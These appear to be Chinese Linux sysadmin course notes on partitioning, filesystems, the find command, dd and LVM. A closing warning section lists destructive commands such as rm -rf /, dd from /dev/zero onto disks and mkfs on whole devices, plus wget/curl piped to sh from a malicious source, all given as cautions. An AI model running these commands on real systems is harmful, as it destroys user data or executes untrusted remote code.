# CH04U01 - 磁盘分区

## 分区工具

  * `fdisk` - MBR
  * `gdisk` - GPT
  * `parted` - MBR/GPT

> `partx/kpartx`：让内核重新读取分区表
  
  
# CH04U02 - 文件系统管理

## ext4/xfs

* 创建文件系统
  * `mkfs.ext4`
  * `mkfs.xfs`
* 检查文件系统
  * `fsck.ext4 [-f]`
  * `xfs_repair -n`
* 修复文件系统
  * `fsck.ext4 -ay`
  * `xfs_repair`

## swap

* 创建
  * `mkswap`
* 激活
  * `swapon`
* 去激活
  * `swapoff`

## 挂装/卸装 文件系统

* 手动
  * `mount` 
  * `umount` （`fuser`）
* 启动时
  * `vim /etc/fstab`
  * `mount -a`

  
# CH04U03 - 常用工具

## 显示磁盘/文件系统信息

* `mount` / `findmnt`
* `lsblk`
* `blkid`
* `df`
* `du`  

## 文件查找工具

* `locate`
  * 依赖于事先创建好的索引数据库 （ `mlocate.db` ）完成文件查找
    * 系统每日自动创建（ 由 `cron` 任务实现 ）
    * 更新索引数据库（ `updatedb` ）
    * 配置文件 -- `/etc/updatedb.conf`
  * 非实时查找、查找速度快、模糊查找
* `find`
  * 通过遍历指定起始路径下文件系统完成文件查找
  * 实时查找、查找速度略慢、精确查找

## find 简介

      find [dir1 dir2 ...] [查找条件]  [处理动作]

* 在实时环境里搜索目录树
  * 比 locate命令慢，但比它更准确
  * 如果没有给定起始目录，就会使用CWD（当前所在目录）
  * 如果没有给定条件，就会匹配所有文件
* 可以对找到的文件执行命令
* 可以只搜索用户具备读取和执行权限的目录

## find -- 按名搜索

* GLOB类（可使用文件通配符）
  * **-name** NAME: 按文件名搜索
  * **-iname** NAME: （不区分大小写）
* RE类（使用正则表达式）
  * **-regex**: 使用正则表达式搜索文件，匹配是整个路径而非其名
  * **-iregex**: （不区分大小写）
  * 可使用 **-regextype** TYPE 指定正则表达式类型
    * emacs （默认）
    * posix-basic / posix-egrep / posix-extended / posix-awk
* 举例
      find -name snow.png
      find -iname snow.png
      find -name s*.png
      find -iname [a-z]now.png
      find -regex [a-z]?\.*.png
      find -iregex [a-z]?\.*.png

## find -- 按 属主/属组 查找

* 名
  * **-user** USERNAME：查找属主是 USERNAME 的所有文件
  * **-group** GRPNAME：查找属组是 GRPNAME 的所有文件
* ID					
  * **-uid** UID：查找属主是 UID 的所有文件
  * **-gid** GID：查找属组是 GID 的所有文件
* “孤儿”						
  * **-nouser**：查找没有属主的文件
  * **-nogroup**：查找没有属组的文件

  
## find -- 使用逻辑运算组合搜索条件

* 搜索条件默认使用逻辑与（-a）连接
  * `find  -user joe -group joe`
  * 搜索属主和属组均为 joe 的文件
* 使用 -o 实现逻辑或
  * `find / -user joe -o -uid 2000`
* 使用 -not 或 ！实现逻辑非
  * `find ! -user joe`
  * `find -not -user joe`
* 可以使用括号来决定逻辑运算的顺序，但是必须使用 bash 的转义符。
  * `find -user joe ! -group joe`
  * `find -user joe -o -user jane`
  * `find -not  \(  -user joe -o -user jane  \)`
* 德·摩根定律

## find -- 按权限查找

* find **-perm** [/|-]MODE
  * 可以八进制或符号式权限模式
* 精确匹配
  * `find -perm 755`　匹配权限模式恰好是755的文件
  * `find -perm g=w`  匹配权限模式恰好是020的文件
* [/|-]
  * 只要 UGO 中任何一类人有写权限，`find -perm /222` 就会匹配
  * 只有 UGO 中所有一类人都有写权限时，`find -perm -222` 才会匹配
  * 只有当其它人（Other）有写权限时，`find -perm -002` 才会匹配

## find -- 按文件大小查找

* 许多 find 条件都接受数值做为参数
  * N 表示等于N
  * -N 表示小于N
  * +N 表示大于N
* find  **-size** 按文件大小查找
  * `find  -size  10M`
  * `find  -size  +10M`
  * `find  -size  -10M`

## find -- 按文件的类型查找

* **-type** TYPE
  * f : 普通文件
  * d : 目录文件
  * l ：符号链接文件
  * b ：块设备文件
  * c ：字符设备文件
  * p ：管道文件
  * s ：套接字文件

## find -- 按时间戳查找

* 可以根据文件 inode 时间戳来进行匹配
* 以“24h”为单位
  * **-atime**：文件最后一次被读取
  * **-mtime**：文件数据最后一次被改变
  * **-ctime**：文件数据或元数据最后一次被改变
* 以“分钟”为单位
  * **-amin**
  * **-mmin**
  * **-cmin**
* 指定时间的计算方式
  * **-daystart**：从一天的 0 点算起，而非当前时间

![find mtime](/assets/figs/find-mtime.png)

## find -- 按时间戳查找实例

* 查找 30 天前修改的文件							
  * `find -ctime +30`
* 查找过去的 30 分钟内修改过的文件
  * `find -cmin -30`
* 查找在20前50天内修改过内容的文件
  * `find -mtime +20  -mtime -50 -type f`

## find -- 按时间戳查找（续）

* 可以根据参考文件 inode 的时间戳进行比较
  * **-newer**  FILE
  * **-anewer** FILE
  * **-cnewer** FILE
* 可以根据指定的时间字符串进行比较
  * **-newermt** TIME
  * **-newerat** TIME
  * **-newerct** TIME
* 举例
  * `find -newermt '2017-11-11 11:11'`
    * 查找比指定修改时间新的所有文件
  * `find ! -newermt '2017-12-12 12:12'`
    * 查找比指定修改时间旧的所有文件
  * `find ! -newermt '2017-12-12 12:12' -newermt '2017-11-11 11:11'`
    * 查找指定的两个时间点之间的所有文件

> **提示**: TIME 可以通过 date 命令替换获得
> * `date -d '-3 days' +'%F %T'`   --- （ 2017-11-11 11:11:11 ）
> * `date -d '-3 days' +'%F %R'`   --- （ 2017-11-11 11:11 ）
> * `date -d '-3 days' +'%F'`      --- （ 2017-11-11 ）

## find -- 对查找结果执行命令

* 要执行的命令前需加 **-exec** 或 **-ok** 选项
  * **-exec**：直接执行
  * **-ok**：在对每个查找到文件执行命令前提示
  * 命令必须以　空格\分号（`　\;`）结尾
  * `{}` 可以用做查找到的文件名的位置标识符
* 不使用  **-exec** 或 **-ok** 选项
  * `find | xargs COMMAND`
  * 避免 COMMAND 不能接受过长的参数

## find -- 对查找结果执行命令实例

* `find  -size  +100M  -ok  gzip  {}  \;`
  * 使用 gzip 压缩所有大于 100M 的文件
* `find  -name  “*.conf”  -exec  cp {}  {}.orig  \;`
  * 备份配置文件，添加 .orig 扩展名
* `find /tmp -ctime +3 -user joe -ok rm {} \;`
  * 提示删除存在时间超过３天以上的joe的临时文件
* `find ~ -perm /o+w  -exec chmod o-w {} \;`
  * 在用户主目录中寻找并去除可被其它用户写入的所有文件
* `find . -type f | xargs ls -lS | head -n 5`
  * 找出当前目录（包含子目录）下最大的5个文件


## dd 命令

* 克隆硬盘设备
  * `dd if=/dev/sda of=/dev/sdb`
* 备份和恢复 MBR
  * 备份 MBR
    * `dd if=/dev/sdX of=/path/to/mbr_file.img bs=512 count=1`
  * 恢复 MBR（危险操作）
    * `dd if=/path/to/mbr_file.img of=/dev/sdX bs=512 count=1`
  * 仅恢复 Boot Loader（危险操作）
    * `dd if=/path/to/mbr_file.img of=/dev/sdX bs=446 count=1`
  * 仅恢复MBR分区表（危险操作）
    * `dd if=/path/to/mbr_file.img of=/dev/sdX bs=1 skip=446 count=64`


## 最危险的命令总结

1、慎用递归删除（rm -rf）

    rm -rf .
	rm -rf *
	rm -rf /


2、慎用覆盖式输出重定向

    > file
	someCMD > file


3、慎用字符设备

* /dev/null
* /dev/zero
* /dev/urandom 

```
mv somefile|somedir /dev/null
cp /dev/null somefile|somedir
dd if=/dev/random of=somefile
dd if=/dev/urandom of=/dev/sdbX bs=4k count=10 seek=100
dd if=/dev/zero of=somefile
dd if=/dev/zero of=/dev/sdX bs=446 count=1
```

4、慎用文件系统 创建/更改尺寸 命令

    mkfs -t ext3|ext4|xfs /dev/sda
	mkfs -t ext3|ext4|xfs /dev/sda1
	resize2fs /dev/sdb1

	
5、慎用通过管道直接执行 shell 脚本

    wget http://malicious_source -O- | sh
	curl http://malicious_source -O- | sh

# CH04U04 - 磁盘限额


# CH04U05 - LVM

## 什么是逻辑卷管理器（LVM）？

* 允许对卷进行方便操作的抽象层，包括重新设定文件系统的大小
* 允许在多个物理设备间重新组织文件系统
  * 将设备指定为物理卷
  * 用一个或者多个物理卷来创建一个卷组
  * 物理卷是用固定大小的物理区域（Physical Extent，PE）来定义的
  * 在物理卷上创建的逻辑卷是由物理区域（PE）组成的
  * 可以在逻辑卷上创建文件系统

## 创建逻辑卷

* 创建物理卷
      pvcreate  /dev/sda3
* 为卷组分配物理卷
      vgcreate  vg0  /dev/sda3
* 从卷组创建逻辑卷
      lvcreate -L 256M  -n data  vg0
      mkfs.ext4 /dev/vg0/data

## 重新设定逻辑卷的大小

* 增加逻辑卷的大小
  * `lvextend` - 可增大逻辑卷
  * `resize2fs` - 可在线增大 EXT3/4 文件系统
  * `xps_growfs` - 可在线增大 XFS 文件系统
* 缩减逻辑卷的大小
  * 不可在线执行 (`umount`)
  * 强制检查文件系统 (`e2fsck -f`) 
  * 缩减文件系统 (`resize2fs`)
  * 缩减逻辑卷   (`lvreduce`)  
* 增加/减小卷组
  * `vgextend`  在已有卷组中添加新的物理卷
  * 用下面的方法可减小卷组：
        pvmove  /dev/sda3
        vgreduce  vg0   /dev/sda3
